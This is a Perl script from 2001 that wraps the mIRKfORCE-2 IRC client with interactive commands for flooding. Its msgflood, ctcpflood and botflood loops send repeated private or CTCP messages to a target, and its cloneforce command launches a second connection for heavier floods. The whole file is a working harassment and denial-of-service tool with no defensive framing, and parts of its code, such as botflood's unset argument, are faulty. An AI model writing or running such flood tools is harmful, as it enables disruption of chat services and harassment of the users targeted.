#!/usr/bin/perl
#mIRKfORCE.shell.pl by wooozer 
#jan 2001

use FileHandle;

use IPC::Open2;

my (@wordlist,@paramlist);

$teller=1;
$haveclone=0;

print "\n\n\n\n\n\n\n\n\n\n\n\n\n";
print STDERR "		mIRKfORCE.shell.pl\n\n";
print STDERR "mIRKfORCE-2 0wned By PERL rel 5\n\n\n\n";
print STDERR "Author: Wooozer\nDate-written: jan 2001\n\n\n\n\n";

$pid = open2(*Reader, *Writer, "mIRKfORCE-2");
print STDERR "mIRKfORCE loaded.\n";
print STDERR "\npid: $pid";
print STDERR "\n\nuse: help  (without slash)\n\n";
Writer->autoflush();
$kidpid=fork();
while (1) {
    if ($kidpid) {
        $readstr=<Reader>;
	print $readstr;
    }
    else {
	$teller=0;
	print STDERR "> ";
	$_=<STDIN>;
	SWITCH: {
	    /server (.*) (.*) (.*)/ && do {
	        if ($haveclone==1) {
		    print clonewr "/load $3 $1 253 1\n";
	        }
	        print Writer "/load $2 $1 253 1\n";
	    };
	    (/j (.*)/ || /join (.*)/) && do {
	        if ($haveclone==1) {
	            print clonewr "/j $1\n";
	        } 
	        print Writer "/j $1\n";
	    };
	    (/p (.*)/ || /part (.*)/ || /leave (.*)/) && do {
	        if ($haveclone==1) {
	            print clonewr "/p $1\n";
	        }
	        print Writer "/p $1\n";
	    };
	    /n (.*)/ && do {
	        if ($haveclone==1) {
		    print clonewr "/n $1";
		}
		print Writer "/n $1";
	    };
	    /msgflood (.*) (.*) (.*)/ && do {
	        while ($teller < $1) {
	            print Writer "/cc PRIVMSG $2 $3 \n";
		    if ($haveclone==1) {
		        print clonewr "/cc PRIVMSG $2 $3 \n";
		    }	    
		    select(undef,undef,undef,0.10);
		    $teller++;
	        }
	    };
	    /ctcpflood (.*) (.*) (.*)/ && do {
	        while ($teller < $1) {
	            print Writer "/cc PRIVMSG $2 :\001$3\001 \n";
		    if ($haveclone==1) {
		        print clonewr "/cc PRIVMSG $2 :\001$3\001 \n";
	 	    }
		    select(undef,undef,undef,0.10);
		    $teller++;
	        }
	    };
	    /botflood (.*)/ && do {
	        while ($teller < $1) {
	            print Writer "/cc PRIVMSG $2 !ping";
		    select(undef,undef,undef,0.10);
		    $teller++;
	        }
	     };
	     /cloneforce/ && do {
	        $clonepid = open2(*clonerd,*clonewr, "mIRKfORCE-2");
	        print STDERR "Loading clone $cloneID ..\n\n";
	        $haveclone=1;
	     };
	     /clonekill/ && do {
	        close($clonepid);
	        $haveclone=0;
	     };
	     /raw (.*)/ && do {
	        print Writer "$1";
	     }; 
	     /help/ && do {
	        print STDERR "mIRKfORCE.shell.pl COMMANDLIST";
	        print STDERR "\n\n";
	        print STDERR "Commandlist [without slash] \n\n";
	        print STDERR "server (server nPort cMasterserver cCloneserver)\n";
	        print STDERR "msgflood (msgflood nMsges cNickname cMsg)\n";
	        print STDERR "ctcpflood (ctcpflood nMsges cNickname cMsg)\n";
	        print STDERR "botflood (botflood cChannel cMsg\n";
	        print STDERR "cloneforce (loads mIRKfORCE / HARDCORE flooding from 1 connection :>) \n";
	        print STDERR "clonekill (kills the clone) \n";
		print STDERR "n (nick cNickpattern) \n";
	        print STDERR "j (join cChannel) \n";
		print STDERR "p (part cChannel) \n";
		print STDERR "raw (raw mIRKfORCEcommand) \n";
	        print STDERR "\n\n";
	    };	    	    
    	}
    }
}